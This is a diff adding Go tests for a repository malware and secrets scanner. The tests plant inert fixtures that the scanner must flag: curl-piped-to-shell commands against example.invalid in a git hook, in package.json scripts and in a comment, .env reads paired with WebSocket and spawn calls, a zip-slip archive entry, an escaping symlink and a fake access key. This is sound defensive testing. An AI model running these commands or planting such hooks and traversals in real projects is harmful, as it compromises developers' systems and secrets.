@@ -4,12 +4,17 @@ import (
 	"archive/zip"
 	"bytes"
 	"context"
+	"crypto/sha256"
+	"encoding/hex"
+	"encoding/json"
 	"os"
 	"path/filepath"
 	"runtime"
 	"strings"
 	"testing"
+	"unicode/utf8"
 
+	"github.com/Kevin-Umali/repyy/internal/intel"
 	"github.com/Kevin-Umali/repyy/internal/model"
 )
 
@@ -31,6 +36,15 @@ func hasRule(findings []model.Finding, id string) bool {
 		}
 	}
 	return false
+}
+
+func ruleFinding(findings []model.Finding, id string) (model.Finding, bool) {
+	for _, finding := range findings {
+		if finding.RuleID == id {
+			return finding, true
+		}
+	}
+	return model.Finding{}, false
 }
 
 func TestBuiltinsCompileAndHaveUniqueIDs(t *testing.T) {
@@ -201,13 +215,14 @@ func TestKnownBenignPackageIsNotBlocklisted(t *testing.T) {
 }
 func TestEvidenceRedactsCredentials(t *testing.T) {
 	root := t.TempDir()
-	writeFixture(t, root, "credentials.txt", "AKIAABCDEFGHIJKLMNOP\napi_key=super-secret-value\n")
+	providerCredential := "AKIA" + "ABCDEFGHIJKLMNOP"
+	writeFixture(t, root, "credentials.txt", providerCredential+"\napi_key=super-secret-value\n")
 	_, findings := New(Options{}).Scan(context.Background(), root)
 	if !hasRule(findings, "SECRET-002") {
 		t.Fatalf("credential was not detected: %+v", findings)
 	}
 	for _, finding := range findings {
-		if strings.Contains(finding.Evidence, "AKIAABCDEFGHIJKLMNOP") || strings.Contains(finding.Evidence, "super-secret-value") {
+		if strings.Contains(finding.Evidence, providerCredential) || strings.Contains(finding.Evidence, "super-secret-value") {
 			t.Fatalf("credential leaked in evidence: %+v", finding)
 		}
 	}
@@ -247,6 +262,19 @@ func TestZipSlipEntry(t *testing.T) {
 	_, findings := New(Options{}).Scan(context.Background(), root)
 	if !hasRule(findings, "ARCHIVE-001") {
 		t.Fatalf("zip traversal was not reported: %+v", findings)
+	}
+}
+
+func TestArchivePathValidationIsPortableAndBoundaryAware(t *testing.T) {
+	for _, unsafe := range []string{"../escape", "dir/../../escape", `..\..\escape`, `/absolute`, `C:\escape`} {
+		if !unsafeArchivePath(unsafe) {
+			t.Errorf("unsafe archive path %q was accepted", unsafe)
+		}
+	}
+	for _, safe := range []string{"..fixture/file", "dir/../file", "normal/file"} {
+		if unsafeArchivePath(safe) {
+			t.Errorf("safe archive path %q was rejected", safe)
+		}
 	}
 }
 
@@ -356,5 +384,364 @@ func TestPublicIPURLIsReported(t *testing.T) {
 	_, findings := New(Options{}).Scan(context.Background(), root)
 	if !hasRule(findings, "IPURL-001") {
 		t.Fatalf("public IP URL was not reported: %+v", findings)
+	}
+}
+
+func TestQualifiedOccurrencesExcludePrivateIPMatches(t *testing.T) {
+	root := t.TempDir()
+	writeFixture(t, root, "README.md", "fixture\n")
+	writeFixture(t, root, "LICENSE", "fixture\n")
+	writeFixture(t, root, "network.txt", "http://127.0.0.1/private http://8.8.8.8/public\n")
+	_, findings := New(Options{}).Scan(context.Background(), root)
+	finding, ok := ruleFinding(findings, "IPURL-001")
+	if !ok || finding.Occurrences != 1 {
+		t.Fatalf("qualified occurrence count = %+v", finding)
+	}
+}
+
+func TestRuleCatalogMetadataIsComplete(t *testing.T) {
+	catalog := BuiltinRuleCatalog()
+	seen := map[string]bool{}
+	for _, info := range catalog {
+		if seen[info.ID] {
+			t.Fatalf("duplicate catalog entry %s", info.ID)
+		}
+		seen[info.ID] = true
+		if info.Category == "" || info.Description == "" || info.Rationale == "" || info.LegitimateUse == "" || info.Remediation == "" || info.MatchScope == "" || info.Disposition == "" || len(info.ApplicablePaths) == 0 {
+			t.Fatalf("incomplete catalog entry: %+v", info)
+		}
+	}
+	for _, rule := range BuiltinRules() {
+		if !seen[rule.ID] {
+			t.Errorf("rule %s is missing from catalog", rule.ID)
+		}
+	}
+	for _, id := range []string{"ARCHIVE-001", "BINARY-001", "COMBO-001", "COMBO-002", "COMBO-003", "EXECBIT-001", "GITHOOK-002", "IOC-HASH-SHA256", "IOC-PKG-*", "OBFS-004", "OBFS-005", "PKG-001", "PKG-002", "PKG-003", "PKG-004", "PKG-005", "PKG-006", "PKG-007", "REPO-001", "REPO-002", "SYMLINK-001", "SYMLINK-002"} {
+		if !seen[id] {
+			t.Errorf("structured rule %s is missing from catalog", id)
+		}
+	}
+}
+
+func TestProcessPrecisionAndCompleteLocations(t *testing.T) {
+	root := t.TempDir()
+	writeFixture(t, root, "README.md", "fixture\n")
+	writeFixture(t, root, "LICENSE", "fixture\n")
+	writeFixture(t, root, "scripts/check.mjs", `import { execFileSync, spawn } from "node:child_process";
+const marker = "process.env";
+const runConvexFunction = () => true;
+execFileSync("node", ["--version"]);
+spawn("node", ["--version"]);
+`)
+	_, findings := New(Options{}).Scan(context.Background(), root)
+	if hasRule(findings, "EXEC-001") || hasRule(findings, "ENV-001") {
+		t.Fatalf("identifier or quoted-token false positive: %+v", findings)
+	}
+	capability, ok := ruleFinding(findings, "EXEC-004")
+	if !ok || capability.Disposition != model.DispositionInformational {
+		t.Fatalf("missing informational import capability: %+v", findings)
+	}
+	execution, ok := ruleFinding(findings, "EXEC-002")
+	if !ok || execution.Occurrences != 2 || len(execution.Locations) != 2 || execution.Locations[0].StartLine != 4 || execution.Locations[1].StartLine != 5 {
+		t.Fatalf("process locations were not retained: %+v", execution)
+	}
+}
+
+func TestLiteralTypeImportsAreNotDynamicImports(t *testing.T) {
+	root := t.TempDir()
+	writeFixture(t, root, "README.md", "fixture\n")
+	writeFixture(t, root, "LICENSE", "fixture\n")
+	writeFixture(t, root, "types.d.ts", `declare const value: import("drizzle-orm").Column;`)
+	writeFixture(t, root, "runtime.js", "const dynamic = require(moduleName);\n")
+	_, findings := New(Options{}).Scan(context.Background(), root)
+	finding, ok := ruleFinding(findings, "IMPORT-001")
+	if !ok || finding.Path != "runtime.js" || finding.Occurrences != 1 {
+		t.Fatalf("literal type import precision failed: %+v", findings)
+	}
+}
+
+func TestMinifiedAndDistributionOutputUsesGeneratedContext(t *testing.T) {
+	root := t.TempDir()
+	writeFixture(t, root, "README.md", "fixture\n")
+	writeFixture(t, root, "LICENSE", "fixture\n")
+	writeFixture(t, root, "packages/app/dist/runtime.js", "eval(value);\n")
+	writeFixture(t, root, "public/sw.js", "eval(value);"+strings.Repeat("x", 700)+"\n")
+	_, findings := New(Options{}).Scan(context.Background(), root)
+	for _, finding := range findings {
+		if finding.Path == "packages/app/dist/runtime.js" || finding.Path == "public/sw.js" {
+			if finding.Context != "generated" || finding.Disposition != model.DispositionInformational {
+				t.Fatalf("build output was not contextualized: %+v", finding)
+			}
+			if finding.RuleID == "OBFS-004" || finding.RuleID == "OBFS-005" {
+				t.Fatalf("weak generated heuristic was retained: %+v", finding)
+			}
+		}
+	}
+}
+
+func TestGeneratedContextSuppressesWeakNoiseButRetainsSecrets(t *testing.T) {
+	root := t.TempDir()
+	writeFixture(t, root, "README.md", "fixture\n")
+	writeFixture(t, root, "LICENSE", "fixture\n")
+	providerCredential := "AKIA" + "ABCDEFGHIJKLMNOP"
+	writeFixture(t, root, "convex/_generated/server.js", "export const env = process.env;\nconst payload = \""+providerCredential+"\";\n"+strings.Repeat("x", 900)+"\n")
+	writeFixture(t, root, "internal/intel/package_metadata_generated.go", "var env = os.Environ()\n"+strings.Repeat("x", 900)+"\n")
+	_, findings := New(Options{}).Scan(context.Background(), root)
+	if hasRule(findings, "ENV-001") || hasRule(findings, "OBFS-004") {
+		t.Fatalf("weak generated-code noise was retained: %+v", findings)
+	}
+	secret, ok := ruleFinding(findings, "SECRET-002")
+	if !ok || secret.Context != "generated" || secret.Confidence != model.ConfidenceHigh {
+		t.Fatalf("strong generated-code indicator was lost or downgraded: %+v", findings)
+	}
+}
+
+func TestStructuredWorkflowRetainsEveryMutableActionLocation(t *testing.T) {
+	root := t.TempDir()
+	writeFixture(t, root, "README.md", "fixture\n")
+	writeFixture(t, root, "LICENSE", "fixture\n")
+	writeFixture(t, root, ".github/workflows/verify.yml", `jobs:
+  test:
+    steps:
+      # uses: ignored/comment@main
+      - uses: actions/checkout@v4
+      - uses: ./local-action
+      - uses: actions/setup-node@0123456789012345678901234567890123456789
+      - uses: pnpm/action-setup@v4
+`)
+	_, findings := New(Options{}).Scan(context.Background(), root)
+	finding, ok := ruleFinding(findings, "CICD-003")
+	if !ok || finding.Occurrences != 2 || len(finding.Locations) != 2 || finding.Locations[0].StartLine != 5 || finding.Locations[1].StartLine != 8 {
+		t.Fatalf("unexpected workflow finding: %+v", finding)
+	}
+}
+
+func TestLocationDetailLimitKeepsOccurrenceCount(t *testing.T) {
+	root := t.TempDir()
+	writeFixture(t, root, "README.md", "fixture\n")
+	writeFixture(t, root, "LICENSE", "fixture\n")
+	writeFixture(t, root, "many.js", strings.Repeat("eval(value);\n", maxLocationsPerFinding+5))
+	coverage, findings := New(Options{}).Scan(context.Background(), root)
+	finding, ok := ruleFinding(findings, "EXEC-001")
+	if !ok || finding.Occurrences != maxLocationsPerFinding+5 || len(finding.Locations) != maxLocationsPerFinding || finding.LocationsOmitted != 5 {
+		t.Fatalf("unexpected location limiting: %+v", finding)
+	}
+	if len(coverage.Warnings) == 0 || !strings.Contains(strings.Join(coverage.Warnings, " "), "location detail") {
+		t.Fatalf("missing location warning: %+v", coverage)
+	}
+}
+
+func TestEvidenceRedactionHandlesSpacesAndUnicode(t *testing.T) {
+	evidence := safeEvidence([]byte(`const client_secret = "correct horse battery staple 🔐"; ` + strings.Repeat("界", 200)))
+	if strings.Contains(evidence, "correct") || strings.Contains(evidence, "horse") || !strings.Contains(evidence, "client_secret=[REDACTED]") || !utf8.ValidString(evidence) {
+		t.Fatalf("unsafe evidence: %q", evidence)
+	}
+}
+
+func TestLiteralDependentRulesRemainCovered(t *testing.T) {
+	root := t.TempDir()
+	writeFixture(t, root, "README.md", "fixture\n")
+	writeFixture(t, root, "LICENSE", "fixture\n")
+	writeFixture(t, root, "browser.js", `setTimeout("run()", 1); import("https://example.invalid/module.js"); if (password === "universal") allow();`)
+	_, findings := New(Options{}).Scan(context.Background(), root)
+	for _, id := range []string{"EXEC-003", "IMPORT-002", "BACKDOOR-002"} {
+		if !hasRule(findings, id) {
+			t.Errorf("literal-dependent rule %s lost coverage: %+v", id, findings)
+		}
+	}
+}
+
+func TestExecutableExamplesInCommentsAreContextual(t *testing.T) {
+	root := t.TempDir()
+	writeFixture(t, root, "README.md", "fixture\n")
+	writeFixture(t, root, "LICENSE", "fixture\n")
+	writeFixture(t, root, "install.sh", "# Example only: curl https://example.invalid/p | sh\n")
+	_, findings := New(Options{}).Scan(context.Background(), root)
+	finding, ok := ruleFinding(findings, "CHAIN-001")
+	if !ok || finding.Context != "example" || finding.Severity == model.SeverityCritical || finding.Disposition != model.DispositionInformational {
+		t.Fatalf("comment example was not contextualized: %+v", finding)
+	}
+}
+
+func TestStructuredRuleFamilyContract(t *testing.T) {
+	root := t.TempDir()
+	knownBody := []byte("known indicator fixture")
+	knownHash := sha256.Sum256(knownBody)
+	database := intel.NewDatabase(intel.Packages, []intel.FileHash{{
+		SHA256: hex.EncodeToString(knownHash[:]), Family: "test family", Source: "https://example.invalid/advisory",
+	}})
+	writeFixture(t, root, "known.bin", string(knownBody))
+	writeFixture(t, root, "native.bin", "\x7fELFfixture")
+	writeFixture(t, root, "tool.sh", "#!/bin/sh\necho fixture\n")
+	if runtime.GOOS != "windows" {
+		if err := os.Chmod(filepath.Join(root, "tool.sh"), 0o755); err != nil {
+			t.Fatal(err)
+		}
+		if err := os.Symlink("missing-target", filepath.Join(root, "broken-link")); err != nil {
+			t.Fatal(err)
+		}
+		if err := os.Symlink(filepath.Join(root, "..", "outside"), filepath.Join(root, "escaping-link")); err != nil {
+			t.Fatal(err)
+		}
+	}
+	writeFixture(t, root, ".git/hooks/pre-commit", "#!/bin/sh\ncurl https://example.invalid/hook | sh\n")
+	writeFixture(t, root, ".github/workflows/verify.yml", "steps:\n  - uses: actions/checkout@v4\n")
+	writeFixture(t, root, "package.json", `{
+  "scripts": {"postinstall": "echo reviewed", "dev": "curl https://example.invalid/tool | sh"},
+  "dependencies": {"tailwind-form-kit": "1.0.0", "remote": "https://example.invalid/pkg.tgz", "placeholder": "0.0.0", "internal-widget": "100.0.0"},
+  "bin": {"fixture": "../escape.js"}
+}`)
+	writeFixture(t, root, "correlated.js", "const socket = new WebSocket(endpoint);\nreadFileSync('.env');\nspawn('node', args);\n")
+	writeFixture(t, root, "evasion.js", "if (process.ppid) spawn('node', args);\n")
+	writeFixture(t, root, "packed.js", "eval(value);\n"+strings.Repeat("ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/", 12)+"\n")
+
+	var archive bytes.Buffer
+	archiveWriter := zip.NewWriter(&archive)
+	entry, err := archiveWriter.Create("../../escape.sh")
+	if err != nil {
+		t.Fatal(err)
+	}
+	if _, err := entry.Write([]byte("fixture")); err != nil {
+		t.Fatal(err)
+	}
+	if err := archiveWriter.Close(); err != nil {
+		t.Fatal(err)
+	}
+	if err := os.WriteFile(filepath.Join(root, "unsafe.zip"), archive.Bytes(), 0o644); err != nil {
+		t.Fatal(err)
+	}
+
+	_, findings := New(Options{Intelligence: database}).Scan(context.Background(), root)
+	want := []string{
+		"ARCHIVE-001", "BINARY-001", "COMBO-001", "COMBO-002", "COMBO-003", "GITHOOK-002",
+		"IOC-HASH-SHA256", "IOC-PKG-GHSA-p7c5-phj5-qm49", "OBFS-004", "OBFS-005", "PKG-001",
+		"PKG-002", "PKG-003", "PKG-004", "PKG-005", "PKG-006", "PKG-007", "REPO-001", "REPO-002",
+	}
+	if runtime.GOOS != "windows" {
+		want = append(want, "EXECBIT-001", "SYMLINK-001", "SYMLINK-002")
+	}
+	for _, id := range want {
+		if !hasRule(findings, id) {
+			t.Errorf("structured rule %s lacks its inert positive: %+v", id, findings)
+		}
+	}
+}
+
+func TestCorrelationsRetainOnlyContributingRulesAndLocations(t *testing.T) {
+	root := t.TempDir()
+	writeFixture(t, root, "README.md", "fixture\n")
+	writeFixture(t, root, "LICENSE", "fixture\n")
+	writeFixture(t, root, "chain.js", "const socket = new WebSocket(endpoint);\nreadFileSync('.env');\nspawn('node', args);\n")
+	writeFixture(t, root, "quoted.js", "const example = 'new WebSocket(endpoint)';\nspawn('node', args);\n")
+	_, findings := New(Options{}).Scan(context.Background(), root)
+	collection, ok := ruleFinding(findings, "COMBO-001")
+	if !ok || strings.Join(collection.ContributingRuleIDs, ",") != "CRED-002,EXFIL-001" || len(collection.Locations) != 2 {
+		t.Fatalf("unexpected collection correlation: %+v", collection)
+	}
+	fetchExecute, ok := ruleFinding(findings, "COMBO-002")
+	if !ok || fetchExecute.Path != "chain.js" || strings.Join(fetchExecute.ContributingRuleIDs, ",") != "EXEC-002,EXFIL-001" || len(fetchExecute.Locations) != 2 {
+		t.Fatalf("unexpected execution correlation: %+v", fetchExecute)
+	}
+	for _, finding := range findings {
+		if finding.RuleID == "COMBO-002" && finding.Path == "quoted.js" {
+			t.Fatalf("quoted example created a correlation: %+v", finding)
+		}
+	}
+}
+
+func TestArchiveEntriesUseInnerPathContextAndLocations(t *testing.T) {
+	root := t.TempDir()
+	writeFixture(t, root, "README.md", "fixture\n")
+	writeFixture(t, root, "LICENSE", "fixture\n")
+	var archive bytes.Buffer
+	writer := zip.NewWriter(&archive)
+	entry, err := writer.Create("src/runtime.js")
+	if err != nil {
+		t.Fatal(err)
+	}
+	if _, err := entry.Write([]byte("spawn('node', args);\n")); err != nil {
+		t.Fatal(err)
+	}
+	if err := writer.Close(); err != nil {
+		t.Fatal(err)
+	}
+	if err := os.WriteFile(filepath.Join(root, "outer-fixture.zip"), archive.Bytes(), 0o644); err != nil {
+		t.Fatal(err)
+	}
+	_, findings := New(Options{}).Scan(context.Background(), root)
+	finding, ok := ruleFinding(findings, "EXEC-002")
+	if !ok || finding.Context != "executable" || finding.Path != "outer-fixture.zip!src/runtime.js" || len(finding.Locations) != 1 || finding.Locations[0].StartLine != 1 {
+		t.Fatalf("archive entry used its outer path context: %+v", finding)
+	}
+}
+
+func TestStructuredDetectorsInspectRootEntriesInsideArchives(t *testing.T) {
+	root := t.TempDir()
+	writeFixture(t, root, "README.md", "fixture\n")
+	writeFixture(t, root, "LICENSE", "fixture\n")
+	var archive bytes.Buffer
+	writer := zip.NewWriter(&archive)
+	entries := map[string]string{
+		"package.json":                 `{"scripts":{"postinstall":"echo reviewed"},"dependencies":{"tailwind-form-kit":"1.0.0"}}`,
+		".github/workflows/verify.yml": "steps:\n  - uses: actions/checkout@v4\n",
+	}
+	for name, body := range entries {
+		entry, err := writer.Create(name)
+		if err != nil {
+			t.Fatal(err)
+		}
+		if _, err := entry.Write([]byte(body)); err != nil {
+			t.Fatal(err)
+		}
+	}
+	if err := writer.Close(); err != nil {
+		t.Fatal(err)
+	}
+	if err := os.WriteFile(filepath.Join(root, "bundle.zip"), archive.Bytes(), 0o644); err != nil {
+		t.Fatal(err)
+	}
+	_, findings := New(Options{}).Scan(context.Background(), root)
+	for _, id := range []string{"PKG-001", "IOC-PKG-GHSA-p7c5-phj5-qm49", "CICD-003"} {
+		finding, ok := ruleFinding(findings, id)
+		if !ok || !strings.HasPrefix(finding.Path, "bundle.zip!") || finding.Line < 1 {
+			t.Errorf("structured archive rule %s missing exact inner location: %+v", id, finding)
+		}
+	}
+}
+
+func TestMultipleMatchesOnOneLineKeepOccurrenceTotal(t *testing.T) {
+	root := t.TempDir()
+	writeFixture(t, root, "README.md", "fixture\n")
+	writeFixture(t, root, "LICENSE", "fixture\n")
+	writeFixture(t, root, "many.js", "eval(a); eval(b); eval(c);\n")
+	_, findings := New(Options{}).Scan(context.Background(), root)
+	finding, ok := ruleFinding(findings, "EXEC-001")
+	if !ok || finding.Occurrences != 3 || len(finding.Locations) != 1 {
+		t.Fatalf("same-line occurrence accounting failed: %+v", finding)
+	}
+}
+
+func TestFindingOrderIsDeterministicAcrossStructuredMaps(t *testing.T) {
+	root := t.TempDir()
+	writeFixture(t, root, "README.md", "fixture\n")
+	writeFixture(t, root, "LICENSE", "fixture\n")
+	writeFixture(t, root, "package.json", `{
+  "scripts": {"postinstall": "echo reviewed", "prepare": "echo reviewed", "dev": "curl https://example.invalid/tool | sh"},
+  "dependencies": {"source-b": "https://example.invalid/b", "source-a": "https://example.invalid/a", "placeholder": "0.0.0"}
+}`)
+	var baseline []byte
+	for attempt := 0; attempt < 10; attempt++ {
+		_, findings := New(Options{}).Scan(context.Background(), root)
+		encoded, err := json.Marshal(findings)
+		if err != nil {
+			t.Fatal(err)
+		}
+		if attempt == 0 {
+			baseline = encoded
+			continue
+		}
+		if !bytes.Equal(encoded, baseline) {
+			t.Fatalf("finding order changed between scans\nfirst: %s\nnext:  %s", baseline, encoded)
+		}
 	}
 }
